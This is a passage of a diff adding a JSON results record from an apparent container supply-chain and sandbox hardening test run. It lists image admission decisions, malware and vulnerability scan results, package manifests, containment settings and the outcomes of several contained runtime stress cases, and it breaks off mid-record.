+        "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+        "reasons": [
+          "image_attestation_expired"
+        ],
+        "role": "runner"
+      },
+      "filesystem_scan": {
+        "file_count": 4594,
+        "findings": [],
+        "passed": true,
+        "tar_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/runner.rootfs.tar",
+        "tar_sha256": "94e3ac265739cf05907b9e2702f05daecd43093d92988af95521ec85b5eb9d5b"
+      },
+      "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+      "independently_comparable": true,
+      "lockfile_sha256": "4bfd5e749f079f1fffc35463ddd03a95e564e416b4e80d97a666e87286e016aa",
+      "malware_scan": {
+        "database_missing": false,
+        "exit_code": 0,
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "passed": true,
+        "scanner_image": "clamav/clamav@sha256:7f5389ccaa2368c383fa80e167ccfe44348d71e685f926fce4755eed1757673a"
+      },
+      "normalized_manifest": {
+        "architecture": "x86_64",
+        "packages": [
+          {
+            "name": "annotated-doc",
+            "version": "0.0.4"
+          },
+          {
+            "name": "annotated-types",
+            "version": "0.7.0"
+          },
+          {
+            "name": "anyio",
+            "version": "4.14.2"
+          },
+          {
+            "name": "cffi",
+            "version": "2.1.0"
+          },
+          {
+            "name": "click",
+            "version": "8.4.2"
+          },
+          {
+            "name": "colorama",
+            "version": "0.4.6"
+          },
+          {
+            "name": "cryptography",
+            "version": "49.0.0"
+          },
+          {
+            "name": "fastapi",
+            "version": "0.139.0"
+          },
+          {
+            "name": "h11",
+            "version": "0.16.0"
+          },
+          {
+            "name": "idna",
+            "version": "3.18"
+          },
+          {
+            "name": "pip",
+            "version": "25.0.1"
+          },
+          {
+            "name": "pycparser",
+            "version": "3.0"
+          },
+          {
+            "name": "pydantic",
+            "version": "2.13.4"
+          },
+          {
+            "name": "pydantic_core",
+            "version": "2.46.4"
+          },
+          {
+            "name": "starlette",
+            "version": "1.3.1"
+          },
+          {
+            "name": "typing-inspection",
+            "version": "0.4.2"
+          },
+          {
+            "name": "typing_extensions",
+            "version": "4.16.0"
+          },
+          {
+            "name": "uvicorn",
+            "version": "0.51.0"
+          }
+        ],
+        "python": "3.12.13",
+        "source_file_count": 24,
+        "source_manifest_sha256": "5d67613c63f6f5b9393f51c664f1194c8f963d920871a72679dc3adc9da52018"
+      },
+      "primary_reference": "echo-certforge-runner:p4-8ccfa65-a",
+      "provenance": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.provenance.json",
+        "sha256": "a05dbd3510b4902b0679587a079876705d0b15148110056cec0b7f40ece70217"
+      },
+      "revoked_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+        "reasons": [
+          "image_digest_revoked"
+        ],
+        "role": "runner"
+      },
+      "sbom": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.spdx.json",
+        "sha256": "0886ee19641c7c4a30c806893f0633bcfc6c93d4297f3a2af811348482c50679",
+        "verified": true
+      },
+      "unknown_key_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+        "reasons": [
+          "unknown_attestation_key"
+        ],
+        "role": "runner"
+      },
+      "vulnerability_scan": {
+        "blocking_vulnerabilities": [],
+        "critical_count": 0,
+        "fixed_high_or_critical_count": 0,
+        "passed": true,
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/runner.trivy.json",
+        "secret_finding_count": 0,
+        "sha256": "21dc03d37d4fccc1f00e25ac57e1d97c2de7d687a3002378b8ef0df32e6d50b1",
+        "tool_returncode": 0,
+        "vulnerability_count": 5
+      }
+    },
+    "signer": {
+      "admission": {
+        "allowed": true,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+        "reasons": [],
+        "role": "signer"
+      },
+      "attestation": {
+        "key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.attestation.json",
+        "private_key_persisted": false,
+        "sha256": "9bd15e8da7bc6dd71a1e81e1087e46f3c2d48934c7dd0605f7194b644bd094f6"
+      },
+      "comparison_image_digest": "sha256:81ce20e06f382adeace0d8baf4fced93746e7486a1854510f0b520148946e3d1",
+      "comparison_reference": "echo-certforge-signer:p4-8ccfa65-b",
+      "compromised_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+        "reasons": [
+          "attestation_key_compromised"
+        ],
+        "role": "signer"
+      },
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "dockerfile_sha256": "2e1bfbed018d690dd7d977f09174a37fbe09391949682ae186ae0c22a98f8634",
+      "drifted_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+        "reasons": [
+          "image_digest_drift"
+        ],
+        "role": "signer"
+      },
+      "exact_digest_reproducible": false,
+      "expired_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+        "reasons": [
+          "image_attestation_expired"
+        ],
+        "role": "signer"
+      },
+      "filesystem_scan": {
+        "file_count": 4596,
+        "findings": [],
+        "passed": true,
+        "tar_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/signer.rootfs.tar",
+        "tar_sha256": "f64d4812e5cb5113d859f32028887849b9b8230f06cc4629dbf7fcc639c9c51d"
+      },
+      "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+      "independently_comparable": true,
+      "lockfile_sha256": "4bfd5e749f079f1fffc35463ddd03a95e564e416b4e80d97a666e87286e016aa",
+      "malware_scan": {
+        "database_missing": false,
+        "exit_code": 0,
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "passed": true,
+        "scanner_image": "clamav/clamav@sha256:7f5389ccaa2368c383fa80e167ccfe44348d71e685f926fce4755eed1757673a"
+      },
+      "normalized_manifest": {
+        "architecture": "x86_64",
+        "packages": [
+          {
+            "name": "annotated-doc",
+            "version": "0.0.4"
+          },
+          {
+            "name": "annotated-types",
+            "version": "0.7.0"
+          },
+          {
+            "name": "anyio",
+            "version": "4.14.2"
+          },
+          {
+            "name": "cffi",
+            "version": "2.1.0"
+          },
+          {
+            "name": "click",
+            "version": "8.4.2"
+          },
+          {
+            "name": "colorama",
+            "version": "0.4.6"
+          },
+          {
+            "name": "cryptography",
+            "version": "49.0.0"
+          },
+          {
+            "name": "fastapi",
+            "version": "0.139.0"
+          },
+          {
+            "name": "h11",
+            "version": "0.16.0"
+          },
+          {
+            "name": "idna",
+            "version": "3.18"
+          },
+          {
+            "name": "pip",
+            "version": "25.0.1"
+          },
+          {
+            "name": "pycparser",
+            "version": "3.0"
+          },
+          {
+            "name": "pydantic",
+            "version": "2.13.4"
+          },
+          {
+            "name": "pydantic_core",
+            "version": "2.46.4"
+          },
+          {
+            "name": "starlette",
+            "version": "1.3.1"
+          },
+          {
+            "name": "typing-inspection",
+            "version": "0.4.2"
+          },
+          {
+            "name": "typing_extensions",
+            "version": "4.16.0"
+          },
+          {
+            "name": "uvicorn",
+            "version": "0.51.0"
+          }
+        ],
+        "python": "3.12.13",
+        "source_file_count": 24,
+        "source_manifest_sha256": "5d67613c63f6f5b9393f51c664f1194c8f963d920871a72679dc3adc9da52018"
+      },
+      "primary_reference": "echo-certforge-signer:p4-8ccfa65-a",
+      "provenance": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.provenance.json",
+        "sha256": "5e27917bdf1f81a3153cd1fdab6d2b04656bff6396c46d5ce8c6a59c4c4a4e03"
+      },
+      "revoked_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+        "reasons": [
+          "image_digest_revoked"
+        ],
+        "role": "signer"
+      },
+      "sbom": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/signer/a/signer-a.spdx.json",
+        "sha256": "53cbe383c67b69b41d2aba797b806d20b8ec9d643b9471ab06f1495f7374b491",
+        "verified": true
+      },
+      "unknown_key_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:797fc9b8454fe61e268930b655ff3eb82a6d36f6f73d4db984b1148f56bc384b",
+        "reasons": [
+          "unknown_attestation_key"
+        ],
+        "role": "signer"
+      },
+      "vulnerability_scan": {
+        "blocking_vulnerabilities": [],
+        "critical_count": 0,
+        "fixed_high_or_critical_count": 0,
+        "passed": true,
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/signer.trivy.json",
+        "secret_finding_count": 0,
+        "sha256": "18fdeac31d7a23df5f0256d568233f5ad26e263341af9628555fe9b0be6c20c1",
+        "tool_returncode": 0,
+        "vulnerability_count": 5
+      }
+    },
+    "verifier": {
+      "admission": {
+        "allowed": true,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+        "reasons": [],
+        "role": "verifier"
+      },
+      "attestation": {
+        "key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.attestation.json",
+        "private_key_persisted": false,
+        "sha256": "258e065caa9fbc253c9dad692567b5b8026e34c3279a25df10d48d1e093461b4"
+      },
+      "comparison_image_digest": "sha256:f5e554174c4851d50206c79b2e633419b6245d73637a0236e4ac64d695adeebd",
+      "comparison_reference": "echo-certforge-verifier:p4-8ccfa65-b",
+      "compromised_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+        "reasons": [
+          "attestation_key_compromised"
+        ],
+        "role": "verifier"
+      },
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "dockerfile_sha256": "8f13e2ab2bb8e8b2980b0c9806de14f3057e3be90b6c2639802c8e299dad6c72",
+      "drifted_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+        "reasons": [
+          "image_digest_drift"
+        ],
+        "role": "verifier"
+      },
+      "exact_digest_reproducible": false,
+      "expired_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+        "reasons": [
+          "image_attestation_expired"
+        ],
+        "role": "verifier"
+      },
+      "filesystem_scan": {
+        "file_count": 4596,
+        "findings": [],
+        "passed": true,
+        "tar_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/verifier.rootfs.tar",
+        "tar_sha256": "f964ce6788e8527984380c27fc15a4a5f29c79ee721d03dd5d9e90223b39fbcb"
+      },
+      "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+      "independently_comparable": true,
+      "lockfile_sha256": "4bfd5e749f079f1fffc35463ddd03a95e564e416b4e80d97a666e87286e016aa",
+      "malware_scan": {
+        "database_missing": false,
+        "exit_code": 0,
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "passed": true,
+        "scanner_image": "clamav/clamav@sha256:7f5389ccaa2368c383fa80e167ccfe44348d71e685f926fce4755eed1757673a"
+      },
+      "normalized_manifest": {
+        "architecture": "x86_64",
+        "packages": [
+          {
+            "name": "annotated-doc",
+            "version": "0.0.4"
+          },
+          {
+            "name": "annotated-types",
+            "version": "0.7.0"
+          },
+          {
+            "name": "anyio",
+            "version": "4.14.2"
+          },
+          {
+            "name": "cffi",
+            "version": "2.1.0"
+          },
+          {
+            "name": "click",
+            "version": "8.4.2"
+          },
+          {
+            "name": "colorama",
+            "version": "0.4.6"
+          },
+          {
+            "name": "cryptography",
+            "version": "49.0.0"
+          },
+          {
+            "name": "fastapi",
+            "version": "0.139.0"
+          },
+          {
+            "name": "h11",
+            "version": "0.16.0"
+          },
+          {
+            "name": "idna",
+            "version": "3.18"
+          },
+          {
+            "name": "pip",
+            "version": "25.0.1"
+          },
+          {
+            "name": "pycparser",
+            "version": "3.0"
+          },
+          {
+            "name": "pydantic",
+            "version": "2.13.4"
+          },
+          {
+            "name": "pydantic_core",
+            "version": "2.46.4"
+          },
+          {
+            "name": "starlette",
+            "version": "1.3.1"
+          },
+          {
+            "name": "typing-inspection",
+            "version": "0.4.2"
+          },
+          {
+            "name": "typing_extensions",
+            "version": "4.16.0"
+          },
+          {
+            "name": "uvicorn",
+            "version": "0.51.0"
+          }
+        ],
+        "python": "3.12.13",
+        "source_file_count": 24,
+        "source_manifest_sha256": "5d67613c63f6f5b9393f51c664f1194c8f963d920871a72679dc3adc9da52018"
+      },
+      "primary_reference": "echo-certforge-verifier:p4-8ccfa65-a",
+      "provenance": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.provenance.json",
+        "sha256": "920a70cdbe2cda9912d45468e4749c535e1b4c1bd687e6822a0597558c12bde3"
+      },
+      "revoked_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+        "reasons": [
+          "image_digest_revoked"
+        ],
+        "role": "verifier"
+      },
+      "sbom": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/verifier/a/verifier-a.spdx.json",
+        "sha256": "876fb2e051bb6b71cac4980896550ec155c7098b8c68ceb3f515361e8b6f17b3",
+        "verified": true
+      },
+      "unknown_key_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:aaaf8bc32e549865af47627f7ff9740883515e6a44ab93a276c007dd352870d1",
+        "reasons": [
+          "unknown_attestation_key"
+        ],
+        "role": "verifier"
+      },
+      "vulnerability_scan": {
+        "blocking_vulnerabilities": [],
+        "critical_count": 0,
+        "fixed_high_or_critical_count": 0,
+        "passed": true,
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/verifier.trivy.json",
+        "secret_finding_count": 0,
+        "sha256": "4b8f5eb05c06154687e3fc21817909dc4495f6d87cc3eb48aaf46a98315813dc",
+        "tool_returncode": 0,
+        "vulnerability_count": 5
+      }
+    },
+    "worker": {
+      "admission": {
+        "allowed": true,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+        "reasons": [],
+        "role": "worker"
+      },
+      "attestation": {
+        "key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.attestation.json",
+        "private_key_persisted": false,
+        "sha256": "f916a48b877c3f4aed154ee53b66fdd61d48fba693e6205d76d81e82ff654cb5"
+      },
+      "comparison_image_digest": "sha256:eb8589342fe68beb2e41e017843e2378d5346d33e5ad297980436a74c456fe45",
+      "comparison_reference": "echo-certforge-worker:p4-8ccfa65-b",
+      "compromised_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+        "reasons": [
+          "attestation_key_compromised"
+        ],
+        "role": "worker"
+      },
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "dockerfile_sha256": "4e8b58e0beaff2e7f165802a268e3a659d66322e69d5734b5e2a9ff9c5aec3d6",
+      "drifted_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+        "reasons": [
+          "image_digest_drift"
+        ],
+        "role": "worker"
+      },
+      "exact_digest_reproducible": false,
+      "expired_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+        "reasons": [
+          "image_attestation_expired"
+        ],
+        "role": "worker"
+      },
+      "filesystem_scan": {
+        "file_count": 4597,
+        "findings": [],
+        "passed": true,
+        "tar_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/worker.rootfs.tar",
+        "tar_sha256": "50fd0698169275d48072a2be92268926992ef4735b8e711f8061e65bc1944f15"
+      },
+      "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+      "independently_comparable": true,
+      "lockfile_sha256": "4bfd5e749f079f1fffc35463ddd03a95e564e416b4e80d97a666e87286e016aa",
+      "malware_scan": {
+        "database_missing": false,
+        "exit_code": 0,
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "passed": true,
+        "scanner_image": "clamav/clamav@sha256:7f5389ccaa2368c383fa80e167ccfe44348d71e685f926fce4755eed1757673a"
+      },
+      "normalized_manifest": {
+        "architecture": "x86_64",
+        "packages": [
+          {
+            "name": "annotated-doc",
+            "version": "0.0.4"
+          },
+          {
+            "name": "annotated-types",
+            "version": "0.7.0"
+          },
+          {
+            "name": "anyio",
+            "version": "4.14.2"
+          },
+          {
+            "name": "cffi",
+            "version": "2.1.0"
+          },
+          {
+            "name": "click",
+            "version": "8.4.2"
+          },
+          {
+            "name": "colorama",
+            "version": "0.4.6"
+          },
+          {
+            "name": "cryptography",
+            "version": "49.0.0"
+          },
+          {
+            "name": "fastapi",
+            "version": "0.139.0"
+          },
+          {
+            "name": "h11",
+            "version": "0.16.0"
+          },
+          {
+            "name": "idna",
+            "version": "3.18"
+          },
+          {
+            "name": "pip",
+            "version": "25.0.1"
+          },
+          {
+            "name": "pycparser",
+            "version": "3.0"
+          },
+          {
+            "name": "pydantic",
+            "version": "2.13.4"
+          },
+          {
+            "name": "pydantic_core",
+            "version": "2.46.4"
+          },
+          {
+            "name": "starlette",
+            "version": "1.3.1"
+          },
+          {
+            "name": "typing-inspection",
+            "version": "0.4.2"
+          },
+          {
+            "name": "typing_extensions",
+            "version": "4.16.0"
+          },
+          {
+            "name": "uvicorn",
+            "version": "0.51.0"
+          }
+        ],
+        "python": "3.12.13",
+        "source_file_count": 25,
+        "source_manifest_sha256": "2cfa31f29c5f4a7115eb84a4185f2a4859d18ac8659cfcbf79b1f2ee3d97bbf9"
+      },
+      "primary_reference": "echo-certforge-worker:p4-8ccfa65-a",
+      "provenance": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.provenance.json",
+        "sha256": "db9ea72c43b18eb7e4423f0126cc1bc0b115765425d2b26fc4434a491cc47618"
+      },
+      "revoked_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+        "reasons": [
+          "image_digest_revoked"
+        ],
+        "role": "worker"
+      },
+      "sbom": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/worker/a/worker-a.spdx.json",
+        "sha256": "f777503e9eb9d87803bb66c26c8522e0427b6952b0e2622d15fe223ce3e11aea",
+        "verified": true
+      },
+      "unknown_key_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:d86e94ba4407f03b06bbb83d365cce25d76b17680e84a73a4b1f7639d1d841f1",
+        "reasons": [
+          "unknown_attestation_key"
+        ],
+        "role": "worker"
+      },
+      "vulnerability_scan": {
+        "blocking_vulnerabilities": [],
+        "critical_count": 0,
+        "fixed_high_or_critical_count": 0,
+        "passed": true,
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/worker.trivy.json",
+        "secret_finding_count": 0,
+        "sha256": "8c9252376973dd217934813dca9398974b3be246798fc555d2111d7da10f2676",
+        "tool_returncode": 0,
+        "vulnerability_count": 5
+      }
+    }
+  },
+  "passed": true,
+  "phase": "P4",
+  "phase_state": "HOSTILE_RUNNER_AND_SUPPLY_CHAIN",
+  "private_key_scan": {
+    "findings": [],
+    "passed": true
+  },
+  "purpose_built_signer_p3_rerun": {
+    "passed": true,
+    "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/p3-purpose-built-signer.json",
+    "release_verdict": "NOT_READY",
+    "returncode": 0,
+    "run_outcome": "COMPLETE",
+    "sha256": "33307c3b25c598cfc56dea9ac91efd7e979c9ef66762ad65d129ff759d579364",
+    "signer_image": "echo-certforge-signer:p4-8ccfa65-a"
+  },
+  "release_verdict": "NOT_READY",
+  "run_outcome": "COMPLETE",
+  "runtime_attack_matrix": {
+    "admitted_payload": {
+      "Cmd": [
+        "python",
+        "-c",
+        "print('admitted')"
+      ],
+      "HostConfig": {
+        "AutoRemove": false,
+        "CapDrop": [
+          "ALL"
+        ],
+        "Init": true,
+        "LogConfig": {
+          "Config": {
+            "max-file": "2",
+            "max-size": "1m"
+          },
+          "Type": "local"
+        },
+        "Memory": 134217728,
+        "MemorySwap": 134217728,
+        "Mounts": [],
+        "NanoCpus": 250000000,
+        "NetworkMode": "none",
+        "OomKillDisable": false,
+        "PidsLimit": 32,
+        "ReadonlyRootfs": true,
+        "SecurityOpt": [
+          "no-new-privileges:true",
+          "seccomp=builtin",
+          "apparmor=docker-default"
+        ],
+        "Tmpfs": {
+          "/run": "rw,nosuid,nodev,noexec,size=8388608,mode=700,uid=65532,gid=65532",
+          "/tmp": "rw,nosuid,nodev,noexec,size=16777216,mode=700,uid=65532,gid=65532",
+          "/workspace": "rw,nosuid,nodev,noexec,size=16777216,mode=700,uid=65532,gid=65532"
+        },
+        "Ulimits": [
+          {
+            "Hard": 1048576,
+            "Name": "fsize",
+            "Soft": 1048576
+          },
+          {
+            "Hard": 1024,
+            "Name": "nofile",
+            "Soft": 1024
+          },
+          {
+            "Hard": 32,
+            "Name": "nproc",
+            "Soft": 32
+          }
+        ]
+      },
+      "Image": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+      "Labels": {
+        "echo.certforge.image_admission_policy": "p4.runner.production.v1",
+        "echo.certforge.image_attestation_key": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "echo.certforge.isolation_profile": "ae6a87c1942b798170332da1dd1fee443189e0a8d03d3b5717a58ec9cfe2ad4d",
+        "echo.certforge.ownership_token": "owner.p4.full.2a3a28ff044f43afbff7bf2442c7fa0a",
+        "echo.certforge.run_id": "run.p4.hostile",
+        "echo.certforge.runner_image": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+        "echo.certforge.tenant_id": "tenant.p4.a"
+      },
+      "NetworkDisabled": true,
+      "StopTimeout": 8,
+      "User": "65532:65532",
+      "WorkingDir": "/workspace"
+    },
+    "baseline": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.baseline",
+        "disposition": "CLEAN",
+        "kind": "baseline",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.baseline",
+        "completed_at": "2026-07-18T07:06:00.177470Z",
+        "container_id": "082ddac07c94f5cba4e91a8f8b40909bdc653dd3617f6bfc3e9967232060784a",
+        "evidence": {
+          "gid_65532": true,
+          "uid_65532": true
+        },
+        "exit_code": 0,
+        "host_impact": false,
+        "kind": "baseline",
+        "logs_sha256": "3194b50581d1aa7f79621971f4e33f6fc168e1424425d432e2d8e167929385d8",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:05:59.479440Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|{\"ok\": true, \"uid\": 65532, \"gid\": 65532}\nTARGET|"
+    },
+    "cancellation": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.cancellation",
+        "disposition": "TERMINATED",
+        "kind": "cancellation",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": true,
+        "case_id": "p4.cancellation",
+        "completed_at": "2026-07-18T07:06:21.871002Z",
+        "container_id": "b9db454c2596b6048c27720f0d0fd98194dd9c42c5c0e8c8f8acacb99914064c",
+        "evidence": {
+          "detected": true
+        },
+        "exit_code": 143,
+        "host_impact": false,
+        "kind": "cancellation",
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:21.025494Z",
+        "timed_out": false,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|"
+    },
+    "cpu_exhaustion": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.cpu_exhaustion",
+        "disposition": "TERMINATED",
+        "kind": "cpu_exhaustion",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.cpu_exhaustion",
+        "completed_at": "2026-07-18T07:06:10.692192Z",
+        "container_id": "f0518ed762edaeba397cd7f01dc5cf12295e8044a07837b16f147627890c2925",
+        "evidence": {
+          "limit_enforced": true
+        },
+        "exit_code": 137,
+        "host_impact": false,
+        "kind": "cpu_exhaustion",
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "oom_killed": false,
+        "schema_version": "1.0.0",
+        "started_at": "2026-07-18T07:06:08.509681Z",
+        "timed_out": true,
+        "unrelated_resources_changed": false
+      },
+      "sanitized_logs": "TARGET|"
+    },
+    "cross_run_injection": {
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "decision": {
+        "case_id": "p4.cross_run_injection",
+        "disposition": "DENIED",
+        "kind": "cross_run_injection",
+        "passed": true,
+        "reasons": []
+      },
+      "observation": {
+        "cancelled": false,
+        "case_id": "p4.cross_run_injection",
+        "completed_at": "2026-07-18T07:06:28.453891Z",
+        "container_id": "d768fe670cf7449ad2ecc776834e25aff4a858fb89b3b18c3757a61fb12e2d86",
+        "evidence": {
